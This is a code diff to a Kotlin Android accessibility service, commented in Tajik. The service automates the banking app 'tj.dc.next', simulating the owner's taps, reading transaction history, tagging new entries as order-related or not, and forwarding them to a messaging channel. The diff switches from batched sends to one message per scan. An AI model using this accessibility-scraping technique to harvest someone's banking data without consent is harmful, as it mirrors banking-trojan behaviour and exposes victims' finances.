@@ -17,8 +17,9 @@ import java.util.Locale
  *      "пахш" мекунад (мисли ангушти соҳиби телефон).
  *   2. Агар саҳифаи асосӣ бошад — ба таби "Таърих" мегузарад.
  *   3. Дар саҳифаи амалиётҳо — хатҳои амалиётро мехонад, ҳар кадоме нав
- *      бошад (пештар надида) мешуморад; ҳар 50-то батчи якҷоя ба канал
- *      мефиристад, бо тамғаи "вобаста ба фармоиш" / "вобастагӣ надорад".
+ *      бошад (пештар надида)-ро ба канал мефиристад, бо тамғаи "вобаста
+ *      ба фармоиш" / "вобастагӣ надорад". Ҳар санҷиш як хабар мефиристад
+ *      (агар чизи нав набошад ҳам — то маълум шавад, ки санҷиш зинда аст).
  *   4. Баъд бармегардад ба хонаи телефон (DC-ро дар пасизамина мемонад).
  *
  * ДИҚҚАТ: тамғагузорӣ дар ин ҷо танҳо аз рӯи ШАКЛИ матн аст (эҳтимолӣ),
@@ -29,7 +30,6 @@ class DcAccessibilityService : AccessibilityService() {
 
     companion object {
         private const val DC_PACKAGE = "tj.dc.next"
-        private const val BATCH_SIZE = 50
 
         private val CARD_REF_RE = Regex("card_(\\d+)", RegexOption.IGNORE_CASE)
         private val AMOUNT_RE = Regex("\\b\\d{1,3}(?:[.,]\\d{2})\\b")
@@ -167,7 +167,7 @@ class DcAccessibilityService : AccessibilityService() {
         }
     }
 
-    /** Хатҳои амалиётро ҷудо мекунад, наваҳояшро мешуморад, батчи 50-то мефиристад. */
+    /** Хатҳои амалиётро ҷудо мекунад, наваҳояшро мешуморад ва ҲАР САНҶИШ як хабар мефиристад. */
     private fun processTransactions(rawLines: List<String>) {
         val prefs = getSharedPreferences("cfg", Context.MODE_PRIVATE)
         val seen = try {
@@ -175,11 +175,7 @@ class DcAccessibilityService : AccessibilityService() {
         } catch (e: Exception) {
             JSONObject()
         }
-        val pendingArr = try {
-            org.json.JSONArray(prefs.getString("scan_batch", "[]"))
-        } catch (e: Exception) {
-            org.json.JSONArray()
-        }
+        val foundArr = org.json.JSONArray()
 
         // Хатҳоеро, ки ба амалиёт монанданд (маблағ ва вақт доранд) ҷудо мекунем
         var i = 0
@@ -192,7 +188,7 @@ class DcAccessibilityService : AccessibilityService() {
                 if (!seen.has(hash)) {
                     seen.put(hash, System.currentTimeMillis())
                     val tag = classify(context5)
-                    pendingArr.put("$tag :: $context5")
+                    foundArr.put("$tag :: $context5")
                 }
             }
             i++
@@ -207,16 +203,10 @@ class DcAccessibilityService : AccessibilityService() {
             val t = seen.optLong(k, 0)
             if (nowTs - t < 7L * 24 * 60 * 60 * 1000) freshSeen.put(k, t)
         }
+        prefs.edit().putString("scan_seen", freshSeen.toString()).apply()
 
-        prefs.edit()
-            .putString("scan_seen", freshSeen.toString())
-            .putString("scan_batch", pendingArr.toString())
-            .apply()
-
-        if (pendingArr.length() >= BATCH_SIZE) {
-            sendBatch(pendingArr)
-            prefs.edit().putString("scan_batch", "[]").apply()
-        }
+        // Ҳар санҷиш як хабар мефиристад — то маълум шавад, ки санҷиш зинда аст
+        sendBatch(foundArr)
 
         // Кор тамом — ба хонаи телефон бармегардем, DC-ро дар пасизамина мемонем
         handler.postDelayed({
@@ -239,9 +229,13 @@ class DcAccessibilityService : AccessibilityService() {
     private fun sendBatch(arr: org.json.JSONArray) {
         val time = SimpleDateFormat("dd.MM HH:mm", Locale.getDefault()).format(java.util.Date())
         val sb = StringBuilder()
-        sb.append("DCSCAN [$time] — батчи ${arr.length()} амалиёт:\n\n")
-        for (i in 0 until arr.length()) {
-            sb.append("${i + 1}. ${arr.getString(i)}\n")
+        if (arr.length() == 0) {
+            sb.append("DCSCAN [$time] — санҷиш иҷро шуд, амалиёти нав ёфт нашуд.")
+        } else {
+            sb.append("DCSCAN [$time] — ${arr.length()} амалиёти нав ёфт шуд:\n\n")
+            for (i in 0 until arr.length()) {
+                sb.append("${i + 1}. ${arr.getString(i)}\n")
+            }
         }
         Sender.enqueue(applicationContext, sb.toString())
         Sender.flushAsync(applicationContext)
